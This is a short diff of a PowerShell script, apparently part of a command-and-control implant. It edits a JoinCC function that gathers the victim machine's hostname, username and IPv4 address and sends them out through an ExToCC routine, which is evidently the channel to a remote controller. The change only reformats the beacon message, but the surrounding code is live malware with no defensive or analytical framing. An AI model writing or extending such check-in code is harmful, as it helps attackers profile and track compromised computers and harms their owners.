@@ -59,7 +59,7 @@ function JoinCC {
   $hstnm = $env:COMPUTERNAME
   $usrnm = $env:USERNAME
   $ipaddr = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceOperationalStatus Up | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1 -ExpandProperty IPAddress)
-  $msg = "JOIN BY: " + $hstnm + $usrnm + $ipaddr
+  $msg = "JOIN BY: " + $hstnm + " - " + $usrnm + " - " + $ipaddr
   ExToCC $msg
 }
 
